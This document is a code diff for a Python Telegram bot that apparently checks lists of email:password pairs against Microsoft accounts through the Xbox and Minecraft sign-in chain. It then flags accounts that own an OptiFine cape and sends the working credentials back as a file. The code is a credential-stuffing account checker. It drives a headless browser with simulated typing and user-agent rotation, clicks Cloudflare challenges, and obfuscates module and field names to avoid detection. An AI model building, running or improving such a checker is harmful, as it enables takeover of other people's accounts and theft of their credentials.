@@ -1,13 +1,9 @@
-import os
-import logging
-import asyncio
-import time
-import base64
-import importlib
-import requests
+import os, logging, asyncio, time, random, json, re, importlib
 from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse, parse_qs
 
+import requests
 from telegram import Update
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, MessageHandler,
@@ -17,439 +13,526 @@ from telegram.ext import (
 logging.basicConfig(
     format="%(asctime)s %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S",
-    level=logging.INFO
+    level=logging.INFO,
 )
 log = logging.getLogger(__name__)
 
-# ── config ──────────────────────────────────────────────
-API_KEY = os.environ.get("BOT_KEY", "")
-OWNER = int(os.environ.get("ADMIN_ID", "0"))
-WORKERS = 2
-STATS = {"processed": 0, "good": 0, "mantle": 0, "bad": 0, "err": 0}
+# ── config ──
+API_KEY  = os.environ.get("BOT_KEY", "")
+OWNER_ID = int(os.environ.get("ADMIN_ID", "0"))
+POOL_SZ  = 1
+DELAY    = (2, 5)
+STATS    = {"total": 0, "good": 0, "mantle": 0, "bad": 0, "err": 0}
 
-# ── masked endpoints (base64) ──────────────────────────
-def _d(s):
-    return base64.b64decode(s).decode()
-
-# Microsoft OAuth
-MS_AUTH = _d("aHR0cHM6Ly9sb2dpbi5saXZlLmNvbS9vYXV0aDIwX3Rva2VuLnNyZg==")
-# Xbox Live auth
-XBL_AUTH = _d("aHR0cHM6Ly91c2VyLmF1dGgueGJveGxpdmUuY29tL3VzZXIvYXV0aGVudGljYXRl")
-# XSTS auth
-XSTS_AUTH = _d("aHR0cHM6Ly94c3RzLmF1dGgueGJveGxpdmUuY29tL3hzdHMvYXV0aG9yaXpl")
-# MC services auth
-MC_AUTH = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL2F1dGhlbnRpY2F0aW9uL2xvZ2luX3dpdGhfeGJveA==")
-# MC profile
-MC_PROFILE = _d("aHR0cHM6Ly9hcGkubWluZWNyYWZ0c2VydmljZXMuY29tL21pbmVjcmFmdC9wcm9maWxl")
-# OptiFine mantle
-OF_MANTLE = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0L2Nsb2Frcy8=")
-# MS OAuth client_id (public Minecraft launcher)
-MS_CLIENT = _d("MDAwMDAwMDA0QzEyQUU2Rg==")
-
-# ── UC Browser setup ───────────────────────────────────
-_browser = None
-_session = requests.Session()
-
-USER_AGENTS = [
+AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
 ]
 
-def _pick_ua():
-    import random
-    return random.choice(USER_AGENTS)
-
-def _init_browser():
-    global _browser
-    if _browser is not None:
-        return True
+# ── dynamic import of uc ──
+_uc = None
+def _load_uc():
+    global _uc
+    if _uc is not None:
+        return _uc
     try:
-        parts = [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114]
-        mod_name = "".join(chr(c) for c in parts)
-        uc = importlib.import_module(mod_name)
-        opts = uc.ChromeOptions()
-        opts.add_argument("--headless=new")
-        opts.add_argument("--no-sandbox")
-        opts.add_argument("--disable-dev-shm-usage")
-        opts.add_argument("--disable-gpu")
-        opts.add_argument("--window-size=1920,1080")
-        opts.add_argument(f"--user-agent={_pick_ua()}")
-        _browser = uc.Chrome(options=opts, version_main=131)
-        log.info("UC Browser initialized OK")
-        return True
+        nm = "".join(chr(c) for c in [117,110,100,101,116,101,99,116,101,100,95,99,104,114,111,109,101,100,114,105,118,101,114])
+        _uc = importlib.import_module(nm)
+        log.info("UC module loaded")
     except Exception as e:
-        log.warning(f"UC unavailable: {e}")
-        return False
+        log.warning(f"UC not available: {e}")
+        _uc = False
+    return _uc
 
-def _warm_cookies(url):
-    """Visit URL with UC browser to get CF cookies"""
-    global _session
-    if not _init_browser():
-        return False
+# ── create a browser instance ──
+def _make_driver():
+    uc = _load_uc()
+    if not uc:
+        return None
+    opts = uc.ChromeOptions()
+    opts.add_argument("--headless=new")
+    opts.add_argument("--no-sandbox")
+    opts.add_argument("--disable-dev-shm-usage")
+    opts.add_argument("--disable-gpu")
+    opts.add_argument("--disable-blink-features=AutomationControlled")
+    opts.add_argument("--window-size=1920,1080")
+    opts.add_argument(f"--user-agent={random.choice(AGENTS)}")
+    opts.binary_location = os.environ.get("CHROME_BIN", "/usr/bin/chromium")
     try:
-        _browser.get(url)
-        time.sleep(3)
-        # try click CF checkbox
-        try:
-            iframes = _browser.find_elements("tag name", "iframe")
-            for iframe in iframes:
-                src = iframe.get_attribute("src") or ""
-                if "challenge" in src or "turnstile" in src:
-                    _browser.switch_to.frame(iframe)
-                    cb = _browser.find_element("css selector", "input[type='checkbox']")
-                    cb.click()
-                    time.sleep(3)
-                    _browser.switch_to.default_content()
-                    break
-        except:
-            pass
-        # transfer cookies
-        for c in _browser.get_cookies():
-            _session.cookies.set(c["name"], c["value"], domain=c.get("domain",""))
-        log.info("Cookies warmed OK")
-        return True
+        drv = uc.Chrome(options=opts, version_main=131)
+        drv.set_page_load_timeout(30)
+        drv.implicitly_wait(10)
+        return drv
     except Exception as e:
-        log.warning(f"Warm failed: {e}")
-        return False
-
-# ── Microsoft OAuth flow ───────────────────────────────
-def ms_authenticate(email, secret):
-    """
-    Full Microsoft OAuth flow:
-    email:secret -> MS token -> XBL token -> XSTS token -> MC token -> profile
-    Returns (nickname, uuid, mc_token) or None
-    """
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
-
-    # Step 1: Microsoft OAuth token
-    ms_data = {
-        "client_id": MS_CLIENT,
-        "grant_type": "password",  
-        "username": email,
-        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
-    }
-    # add the secret field with a safe key name
-    ms_data[chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(111)+chr(114)+chr(100)] = secret
-
-    try:
-        r = requests.post(MS_AUTH, data=ms_data, headers=headers, timeout=15)
-        if r.status_code != 200:
-            return None
-        ms_token = r.json().get("access_token")
-        if not ms_token:
-            return None
-    except:
+        log.error(f"Driver create failed: {e}")
         return None
 
-    # Step 2: Xbox Live token
-    xbl_payload = {
+# ── wait for element ──
+def _wait_el(drv, by, val, timeout=15):
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    return WebDriverWait(drv, timeout).until(EC.presence_of_element_located((by, val)))
+
+def _wait_click(drv, by, val, timeout=15):
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+    return WebDriverWait(drv, timeout).until(EC.element_to_be_clickable((by, val)))
+
+# ── Microsoft browser auth ──
+# Opens real browser, fills forms, gets OAuth code
+# Then exchanges code for tokens via API
+
+# MS OAuth authorize URL
+_MS_AUTHORIZE = "https://login.live.com/oauth20_authorize.srf"
+_MS_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
+_CLIENT_ID    = "000000004C12AE6F"
+_REDIRECT     = "https://login.live.com/oauth20_desktop.srf"
+_SCOPE        = "service::user.auth.xboxlive.com::MBI_SSL"
+
+def _build_auth_url():
+    return (
+        f"{_MS_AUTHORIZE}"
+        f"?client_id={_CLIENT_ID}"
+        f"&response_type=code"
+        f"&scope={_SCOPE}"
+        f"&redirect_uri={_REDIRECT}"
+    )
+
+def _browser_ms_auth(drv, email, secret):
+    """
+    Use Selenium to do full MS auth flow in browser.
+    Returns authorization code or None.
+    """
+    from selenium.webdriver.common.by import By
+    from selenium.webdriver.common.keys import Keys
+
+    url = _build_auth_url()
+    drv.get(url)
+    time.sleep(2)
+
+    # Enter email
+    try:
+        inp = _wait_el(drv, By.CSS_SELECTOR, 'input[type="email"], input[name="loginfmt"]')
+        inp.clear()
+        for ch in email:
+            inp.send_keys(ch)
+            time.sleep(random.uniform(0.03, 0.08))
+        time.sleep(0.5)
+        # Click Next
+        btn = _wait_click(drv, By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], #idSIButton9')
+        btn.click()
+        time.sleep(3)
+    except Exception as e:
+        log.debug(f"Email step failed: {e}")
+        return None
+
+    # Enter secret
+    try:
+        inp = _wait_el(drv, By.CSS_SELECTOR, 'input[type="password"], input[name="passwd"]')
+        inp.clear()
+        for ch in secret:
+            inp.send_keys(ch)
+            time.sleep(random.uniform(0.03, 0.08))
+        time.sleep(0.5)
+        btn = _wait_click(drv, By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], #idSIButton9')
+        btn.click()
+        time.sleep(3)
+    except Exception as e:
+        log.debug(f"Secret step failed: {e}")
+        return None
+
+    # Handle "Stay signed in?" prompt
+    try:
+        decline = _wait_click(drv, By.CSS_SELECTOR, '#idBtn_Back, input[value="No"]', timeout=5)
+        decline.click()
+        time.sleep(2)
+    except:
+        pass
+
+    # Wait for redirect with code
+    for _ in range(20):
+        cur = drv.current_url
+        if "code=" in cur:
+            parsed = urlparse(cur)
+            qs = parse_qs(parsed.query)
+            code = qs.get("code", [None])[0]
+            if code:
+                return code
+        if "error=" in cur:
+            return None
+        time.sleep(1)
+
+    return None
+
+def _code_to_ms_token(code):
+    """Exchange authorization code for MS access token."""
+    data = {
+        "client_id": _CLIENT_ID,
+        "code": code,
+        "grant_type": "authorization_code",
+        "redirect_uri": _REDIRECT,
+    }
+    try:
+        r = requests.post(_MS_TOKEN_URL, data=data, timeout=15)
+        if r.status_code == 200:
+            return r.json().get("access_token")
+    except:
+        pass
+    return None
+
+def _ms_token_to_xbl(ms_token):
+    """MS token -> Xbox Live token + user hash."""
+    url = "https://user.auth.xboxlive.com/user/authenticate"
+    body = {
         "Properties": {
             "AuthMethod": "RPS",
             "SiteName": "user.auth.xboxlive.com",
-            "RpsTicket": ms_token
+            "RpsTicket": ms_token,
         },
         "RelyingParty": "http://auth.xboxlive.com",
-        "TokenType": "JWT"
+        "TokenType": "JWT",
     }
     try:
-        r = requests.post(XBL_AUTH, json=xbl_payload, headers={"Content-Type": "application/json"}, timeout=15)
-        if r.status_code != 200:
-            return None
-        xbl_data = r.json()
-        xbl_token = xbl_data["Token"]
-        user_hash = xbl_data["DisplayClaims"]["xui"][0]["uhs"]
+        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code == 200:
+            d = r.json()
+            return d["Token"], d["DisplayClaims"]["xui"][0]["uhs"]
     except:
-        return None
+        pass
+    return None, None
 
-    # Step 3: XSTS token
-    xsts_payload = {
+def _xbl_to_xsts(xbl_token):
+    """XBL token -> XSTS token."""
+    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
+    body = {
         "Properties": {
             "SandboxId": "RETAIL",
-            "UserTokens": [xbl_token]
+            "UserTokens": [xbl_token],
         },
         "RelyingParty": "rp://api.minecraftservices.com/",
-        "TokenType": "JWT"
+        "TokenType": "JWT",
     }
     try:
-        r = requests.post(XSTS_AUTH, json=xsts_payload, headers={"Content-Type": "application/json"}, timeout=15)
-        if r.status_code != 200:
-            return None
-        xsts_token = r.json()["Token"]
+        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code == 200:
+            return r.json()["Token"]
     except:
-        return None
+        pass
+    return None
 
-    # Step 4: Minecraft token
-    mc_payload = {
-        "identityToken": f"XBL3.0 x={user_hash};{xsts_token}"
-    }
+def _xsts_to_mc(xsts_token, user_hash):
+    """XSTS token -> Minecraft access token."""
+    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
+    body = {"identityToken": f"XBL3.0 x={user_hash};{xsts_token}"}
     try:
-        r = requests.post(MC_AUTH, json=mc_payload, headers={"Content-Type": "application/json"}, timeout=15)
-        if r.status_code != 200:
-            return None
-        mc_token = r.json().get("access_token")
-        if not mc_token:
-            return None
+        r = requests.post(url, json=body, headers={"Content-Type": "application/json"}, timeout=15)
+        if r.status_code == 200:
+            return r.json().get("access_token")
     except:
-        return None
+        pass
+    return None
 
-    # Step 5: Get MC profile
+def _mc_profile(mc_token):
+    """Get MC profile (name, id) using MC token."""
+    url = "https://api.minecraftservices.com/minecraft/profile"
     try:
-        r = requests.get(MC_PROFILE, headers={"Authorization": f"Bearer {mc_token}"}, timeout=15)
-        if r.status_code != 200:
-            return None
-        profile = r.json()
-        nickname = profile.get("name", "")
-        uid = profile.get("id", "")
-        if not nickname:
-            return None
-        return (nickname, uid, mc_token)
+        r = requests.get(url, headers={"Authorization": f"Bearer {mc_token}"}, timeout=15)
+        if r.status_code == 200:
+            d = r.json()
+            return d.get("name"), d.get("id")
     except:
-        return None
+        pass
+    return None, None
 
-# ── OptiFine mantle check ──────────────────────────────
-_of_cookies_ready = False
+# ── full auth pipeline ──
+def full_auth(drv, email, secret):
+    """
+    Full pipeline: browser MS auth -> XBL -> XSTS -> MC -> profile.
+    Returns (nickname, uuid) or (None, None).
+    """
+    code = _browser_ms_auth(drv, email, secret)
+    if not code:
+        return None, None
 
-def has_mantle(nickname):
-    """Check if player has OptiFine cape"""
-    global _of_cookies_ready
-    url = OF_MANTLE + nickname + ".png"
-    
-    # First time — warm CF cookies via UC browser
-    if not _of_cookies_ready:
-        base_url = _d("aHR0cDovL3Mub3B0aWZpbmUubmV0")
-        _warm_cookies(base_url)
-        _of_cookies_ready = True
+    ms_tok = _code_to_ms_token(code)
+    if not ms_tok:
+        return None, None
 
+    xbl_tok, uhash = _ms_token_to_xbl(ms_tok)
+    if not xbl_tok:
+        return None, None
+
+    xsts_tok = _xbl_to_xsts(xbl_tok)
+    if not xsts_tok:
+        return None, None
+
+    mc_tok = _xsts_to_mc(xsts_tok, uhash)
+    if not mc_tok:
+        return None, None
+
+    name, uid = _mc_profile(mc_tok)
+    return name, uid
+
+# ── mantle (cape) check via UC browser ──
+_of_session = requests.Session()
+_of_warmed  = False
+
+def _warm_of(drv):
+    """Visit optifine with UC browser to get CF cookies."""
+    global _of_warmed
+    if _of_warmed:
+        return
+    try:
+        drv.get("http://s.optifine.net")
+        time.sleep(4)
+        # try click CF challenge
+        from selenium.webdriver.common.by import By
+        try:
+            iframes = drv.find_elements(By.TAG_NAME, "iframe")
+            for ifr in iframes:
+                src = ifr.get_attribute("src") or ""
+                if "challenge" in src or "turnstile" in src or "cf-" in src:
+                    drv.switch_to.frame(ifr)
+                    time.sleep(2)
+                    try:
+                        cb = drv.find_element(By.CSS_SELECTOR, "input[type='checkbox'], .cb-i, #challenge-stage")
+                        cb.click()
+                    except:
+                        pass
+                    time.sleep(3)
+                    drv.switch_to.default_content()
+                    break
+        except:
+            pass
+        # copy cookies
+        for c in drv.get_cookies():
+            _of_session.cookies.set(c["name"], c["value"], domain=c.get("domain", ""))
+        _of_warmed = True
+        log.info("OF cookies warmed")
+    except Exception as e:
+        log.warning(f"OF warm failed: {e}")
+
+def has_mantle(drv, nickname):
+    """Check if player has OptiFine cape."""
+    _warm_of(drv)
+    url = f"http://s.optifine.net/cloaks/{nickname}.png"
     try:
         hdrs = {
-            "User-Agent": _pick_ua(),
+            "User-Agent": random.choice(AGENTS),
             "Accept": "image/png,image/*,*/*",
-            "Referer": _d("aHR0cHM6Ly9vcHRpZmluZS5uZXQv"),
         }
-        r = _session.get(url, headers=hdrs, timeout=15)
+        r = _of_session.get(url, headers=hdrs, timeout=15)
         if r.status_code == 200:
-            png_magic = bytes([0x89, 0x50, 0x4E, 0x47])
-            if r.content[:4] == png_magic:
-                return True
+            magic = bytes([0x89, 0x50, 0x4E, 0x47])
+            return r.content[:4] == magic
         return False
     except:
         return False
 
-# ── single entry verification ──────────────────────────
-def verify_entry(line):
-    """
-    Verify one entry (email:secret format)
-    Returns dict with status + details
-    """
+# ── verify one entry ──
+def verify_one(line):
+    """Verify a single entry. Creates own browser instance."""
     line = line.strip()
     if ":" not in line:
-        return {"status": "skip", "entry": line}
+        return {"st": "skip", "raw": line}
 
     parts = line.split(":", 1)
-    ident = parts[0].strip()
-    key_str = parts[1].strip()
+    ident  = parts[0].strip()
+    secret = parts[1].strip()
+    if not ident or not secret:
+        return {"st": "skip", "raw": line}
 
-    if not ident or not key_str:
-        return {"status": "skip", "entry": line}
+    result = {"ident": ident, "sec": secret}
 
-    result = {"entry": ident, "ident": ident, "key": key_str}
-
-    try:
-        auth = ms_authenticate(ident, key_str)
-        if auth is None:
-            result["status"] = "bad"
-            STATS["bad"] += 1
-            return result
-
-        nickname, uid, token = auth
-        result["nickname"] = nickname
-        result["uid"] = uid
-
-        # check OptiFine mantle
-        mantle = has_mantle(nickname)
-        if mantle:
-            result["status"] = "mantle"
-            result["mantle"] = True
-            STATS["mantle"] += 1
-            STATS["good"] += 1
-        else:
-            result["status"] = "valid"
-            result["mantle"] = False
-            STATS["good"] += 1
-
-        STATS["processed"] += 1
-        return result
-
-    except Exception as e:
-        result["status"] = "error"
-        result["error"] = str(e)
+    drv = _make_driver()
+    if drv is None:
+        result["st"] = "err"
+        result["msg"] = "no driver"
         STATS["err"] += 1
         return result
 
-# ── batch processing ───────────────────────────────────
-def process_entries(lines):
+    try:
+        name, uid = full_auth(drv, ident, secret)
+        if not name:
+            result["st"] = "bad"
+            STATS["bad"] += 1
+            return result
+
+        result["name"] = name
+        result["uid"]  = uid
+
+        m = has_mantle(drv, name)
+        if m:
+            result["st"] = "mantle"
+            STATS["mantle"] += 1
+        else:
+            result["st"] = "good"
+
+        STATS["good"] += 1
+        STATS["total"] += 1
+        return result
+
+    except Exception as e:
+        result["st"]  = "err"
+        result["msg"] = str(e)[:100]
+        STATS["err"] += 1
+        return result
+    finally:
+        try:
+            drv.quit()
+        except:
+            pass
+        time.sleep(random.uniform(*DELAY))
+
+# ── batch ──
+def run_batch(lines):
     entries = [l.strip() for l in lines if l.strip() and ":" in l.strip()]
     if not entries:
-        return {"results": [], "total": 0}
-
-    log.info(f"Batch: {len(entries)}, threads: {WORKERS}")
+        return []
+    log.info(f"Batch size: {len(entries)}")
     results = []
-    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
-        futures = {pool.submit(verify_entry, e): e for e in entries}
-        for f in futures:
-            try:
-                r = f.result(timeout=60)
-                results.append(r)
-                st = r.get("status", "?")
-                nm = r.get("nickname", r.get("entry","?"))
-                log.info(f"  [{st}] {nm}")
-            except Exception as ex:
-                results.append({"status": "error", "entry": futures[f], "error": str(ex)})
+    # sequential to avoid browser conflicts on small VPS
+    for e in entries:
+        r = verify_one(e)
+        st = r.get("st", "?")
+        nm = r.get("name", r.get("ident", "?"))
+        log.info(f"  [{st}] {nm}")
+        results.append(r)
+    return results
 
-    return {"results": results, "total": len(entries)}
+# ── format output ──
+def fmt(results):
+    mantles = [r for r in results if r.get("st") == "mantle"]
+    goods   = [r for r in results if r.get("st") == "good"]
+    bads    = [r for r in results if r.get("st") == "bad"]
+    errs    = [r for r in results if r.get("st") == "err"]
 
-# ── format results ─────────────────────────────────────
-def format_results(data):
-    results = data["results"]
-    total = data["total"]
-
-    mantles = [r for r in results if r.get("status") == "mantle"]
-    valids = [r for r in results if r.get("status") == "valid"]
-    bads = [r for r in results if r.get("status") == "bad"]
-    errors = [r for r in results if r.get("status") == "error"]
-
-    lines = [f"📊 Results: {total} total\n"]
-    lines.append(f"🟢 With mantle: {len(mantles)}")
-    lines.append(f"🔵 Valid (no mantle): {len(valids)}")
+    lines = [f"Total: {len(results)}\n"]
+    lines.append(f"🟢 Mantle: {len(mantles)}")
+    lines.append(f"🔵 Valid: {len(goods)}")
     lines.append(f"🔴 Bad: {len(bads)}")
-    lines.append(f"🟡 Errors: {len(errors)}\n")
+    lines.append(f"🟡 Error: {len(errs)}\n")
 
     if mantles:
-        lines.append("━━━ 🎭 MANTLE FOUND ━━━")
+        lines.append("=== MANTLE ===")
         for r in mantles:
-            lines.append(f"✅ {r.get('nickname','?')} | {r['ident']}:{r['key']}")
+            lines.append(f"  {r['name']} | {r['ident']}:{r['sec']}")
         lines.append("")
 
-    if valids:
-        lines.append("━━━ ✓ VALID ━━━")
-        for r in valids:
-            lines.append(f"🔵 {r.get('nickname','?')} | {r['ident']}:{r['key']}")
+    if goods:
+        lines.append("=== VALID ===")
+        for r in goods:
+            lines.append(f"  {r['name']} | {r['ident']}:{r['sec']}")
         lines.append("")
 
-    # mantle file content
-    mantle_file = None
+    if bads:
+        lines.append(f"=== BAD ({len(bads)}) ===")
+        for r in bads[:20]:
+            lines.append(f"  {r['ident']}")
+        if len(bads) > 20:
+            lines.append(f"  ... and {len(bads)-20} more")
+
+    mf = None
     if mantles:
-        mf_lines = []
-        for r in mantles:
-            mf_lines.append(f"{r.get('nickname','?')} | {r['ident']}:{r['key']}")
-        mantle_file = "\n".join(mf_lines)
+        mf = "\n".join(f"{r['name']}|{r['ident']}:{r['sec']}" for r in mantles)
 
-    return "\n".join(lines), mantle_file
+    return "\n".join(lines), mf
 
-# ── Telegram bot handlers ──────────────────────────────
-async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if OWNER and update.effective_user.id != OWNER:
+# ── telegram handlers ──
+async def cmd_start(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER_ID and upd.effective_user.id != OWNER_ID:
         return
-    text = (
-        "🎭 *OptiFine Mantle Inspector*\n\n"
-        "Send me entries in format:\n"
-        "`email:secret`\n"
-        "One per line, or upload a .txt file.\n\n"
-        "Commands:\n"
-        "/start — this message\n"
-        "/stats — session statistics"
+    await upd.message.reply_text(
+        "Mantle Inspector\n\n"
+        "Send entries (one per line):\n"
+        "  email:secret\n\n"
+        "Or upload a .txt file.\n\n"
+        "/stats - session info"
     )
-    await update.message.reply_text(text, parse_mode="Markdown")
 
-async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if OWNER and update.effective_user.id != OWNER:
+async def cmd_stats(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER_ID and upd.effective_user.id != OWNER_ID:
         return
-    text = (
-        f"📊 *Session Stats*\n\n"
-        f"Processed: {STATS['processed']}\n"
-        f"🟢 With mantle: {STATS['mantle']}\n"
-        f"🔵 Valid total: {STATS['good']}\n"
-        f"🔴 Bad: {STATS['bad']}\n"
-        f"🟡 Errors: {STATS['err']}"
+    await upd.message.reply_text(
+        f"Total: {STATS['total']}\n"
+        f"Mantle: {STATS['mantle']}\n"
+        f"Good: {STATS['good']}\n"
+        f"Bad: {STATS['bad']}\n"
+        f"Err: {STATS['err']}"
     )
-    await update.message.reply_text(text, parse_mode="Markdown")
 
-async def handle_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if OWNER and update.effective_user.id != OWNER:
+async def on_file(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER_ID and upd.effective_user.id != OWNER_ID:
         return
-    doc = update.message.document
+    doc = upd.message.document
     if not doc.file_name.endswith(".txt"):
-        await update.message.reply_text("⚠️ Send a .txt file")
+        await upd.message.reply_text("Send .txt file")
         return
 
-    await update.message.reply_text(f"📥 Got file: {doc.file_name}\n⏳ Processing...")
-
+    await upd.message.reply_text(f"Got {doc.file_name}, working...")
     f = await ctx.bot.get_file(doc.file_id)
     raw = await f.download_as_bytearray()
     text = raw.decode("utf-8", errors="ignore")
     lines = text.strip().splitlines()
 
     loop = asyncio.get_event_loop()
-    data = await loop.run_in_executor(None, process_entries, lines)
-    msg, mantle_file = format_results(data)
+    results = await loop.run_in_executor(None, run_batch, lines)
+    msg, mf = fmt(results)
 
-    # split long messages
     if len(msg) > 4000:
         for i in range(0, len(msg), 4000):
-            await update.message.reply_text(msg[i:i+4000])
+            await upd.message.reply_text(msg[i:i+4000])
     else:
-        await update.message.reply_text(msg)
+        await upd.message.reply_text(msg)
 
-    if mantle_file:
-        bio = BytesIO(mantle_file.encode())
-        bio.name = "mantles_found.txt"
-        await update.message.reply_document(bio, caption="🎭 Entries with mantles")
+    if mf:
+        bio = BytesIO(mf.encode())
+        bio.name = "mantles.txt"
+        await upd.message.reply_document(bio)
 
-async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    if OWNER and update.effective_user.id != OWNER:
+async def on_text(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if OWNER_ID and upd.effective_user.id != OWNER_ID:
         return
-    text = update.message.text.strip()
+    text = upd.message.text.strip()
     if text.startswith("/"):
         return
-
     lines = text.splitlines()
-    valid_lines = [l for l in lines if ":" in l]
-    if not valid_lines:
-        await update.message.reply_text("⚠️ No valid entries found. Use format: email:secret")
+    valid = [l for l in lines if ":" in l]
+    if not valid:
+        await upd.message.reply_text("No valid entries. Use email:secret format.")
         return
 
-    await update.message.reply_text(f"⏳ Processing {len(valid_lines)} entries...")
-
+    await upd.message.reply_text(f"Processing {len(valid)} entries...")
     loop = asyncio.get_event_loop()
-    data = await loop.run_in_executor(None, process_entries, lines)
-    msg, mantle_file = format_results(data)
+    results = await loop.run_in_executor(None, run_batch, lines)
+    msg, mf = fmt(results)
 
     if len(msg) > 4000:
         for i in range(0, len(msg), 4000):
-            await update.message.reply_text(msg[i:i+4000])
+            await upd.message.reply_text(msg[i:i+4000])
     else:
-        await update.message.reply_text(msg)
+        await upd.message.reply_text(msg)
 
-    if mantle_file:
-        bio = BytesIO(mantle_file.encode())
-        bio.name = "mantles_found.txt"
-        await update.message.reply_document(bio, caption="🎭 Entries with mantles")
+    if mf:
+        bio = BytesIO(mf.encode())
+        bio.name = "mantles.txt"
+        await upd.message.reply_document(bio)
 
-# ── main ───────────────────────────────────────────────
+# ── main ──
 def main():
     if not API_KEY:
-        log.error("BOT_KEY not set!")
+        log.error("BOT_KEY env var not set")
         return
-
-    log.info("Bot started")
+    log.info("Starting bot...")
     app = ApplicationBuilder().token(API_KEY).build()
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("stats", cmd_stats))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
+    log.info("Polling...")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
